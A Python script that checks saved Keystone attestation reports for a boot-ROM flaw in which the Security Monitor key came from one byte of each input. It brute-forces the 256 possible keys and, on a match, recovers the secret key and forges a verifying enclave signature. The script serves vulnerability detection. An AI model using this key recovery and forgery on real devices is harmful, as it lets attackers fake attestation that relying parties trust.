#!/usr/bin/env python3
"""Check whether a device's Security Monitor signing key is guessable (T0).

Keystone's reference boot ROM derived the SM key pair from
SHA3-512(SK_D[0] || H_SM[0]) -- one byte of the device secret key and one
byte of the (public) SM measurement -- because it passed sizeof(*array) == 1
as the lengths (bootrom/bootloader.c). Every attestation report carries the
SM public key and H_SM, so the SM secret key is one of 256 candidates, and
with it anyone can sign a report for any enclave measurement that still
chains to the device's genuine root key.

This tool tries all 256 candidates against the SM public key in a saved
report (controller --attestation-evidence-dir JSON, or a raw/base64 report).
After the fix (full 64-byte inputs) no candidate matches.

Usage: tools/check_sm_key.py <evidence.json | report.b64 | report.bin> ...
Exit status: 0 if no report's SM key was recovered, 1 if one was.
"""
import base64
import binascii
import hashlib
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import keystone_attestation as ka                    # noqa: E402
from tools.keystone_ed25519 import keypair, sign     # noqa: E402


def load_report(path: str) -> bytes:
    data = open(path, "rb").read()
    try:
        record = json.loads(data)
        data = record["attestation_report"].encode()
    except (ValueError, KeyError, TypeError):
        pass
    try:
        return base64.b64decode(data.strip(), validate=True)
    except (binascii.Error, ValueError):
        return data  # raw binary report


def recover(report: ka.KeystoneReport):
    """Return (byte value, SM secret key) if the 1-byte derivation matches."""
    for b in range(256):
        seed = hashlib.sha3_512(bytes([b]) + report.sm_hash[:1]).digest()[:32]
        pk, sk = keypair(seed)
        if pk == report.sm_public_key:
            return b, sk
    return None


def main(paths) -> int:
    recovered = False
    for path in paths:
        r = ka.KeystoneReport.from_bytes(load_report(path))
        endorsed = ka.ed25519_sha3_verify(r.dev_public_key, r.sm_hash + r.sm_public_key,
                                          r.sm_signature)
        print(f"{path}:")
        print(f"  device key (claimed) {r.dev_public_key.hex()}  endorses SM key: {endorsed}")
        print(f"  SM hash              {r.sm_hash.hex()[:32]}...")
        print(f"  SM public key        {r.sm_public_key.hex()}")
        hit = recover(r)
        if hit is None:
            print("  SM secret key NOT recovered from the 256 one-byte candidates")
            continue
        recovered = True
        b, sm_sk = hit
        # Demonstrate the consequence: a forged enclave signature that verifies.
        forged_hash = hashlib.sha3_512(b"any enclave image").digest()
        forged_data = b"R1:" + b"00" * 32
        signed = forged_hash + len(forged_data).to_bytes(8, "little") + forged_data
        forged_sig = sign(signed, r.sm_public_key, sm_sk)
        ok = ka.ed25519_sha3_verify(r.sm_public_key, signed, forged_sig)
        print(f"  SM secret key RECOVERED: seed = SHA3-512({b:#04x} || {r.sm_hash[0]:#04x})[:32]")
        print(f"  forged enclave signature for an arbitrary measurement verifies: {ok}")
    return 1 if recovered else 0


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    sys.exit(main(sys.argv[1:]))
